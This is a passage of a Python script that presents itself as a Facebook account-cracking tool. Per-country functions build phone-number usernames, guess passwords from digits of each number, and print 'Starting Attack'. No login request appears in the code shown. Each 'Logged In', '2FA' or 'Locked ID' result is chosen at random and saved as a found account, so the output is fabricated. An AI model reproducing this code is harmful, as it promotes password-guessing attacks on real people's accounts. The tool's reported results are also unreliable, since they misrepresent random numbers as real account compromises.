                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def UK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United Kingdom',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(uk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def RUS():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Russia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(rus)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def TURK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Turkey',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(turk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def FR():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('France',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(fr)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ARG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Argentina',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(arg)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ITAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Italy',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ital)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
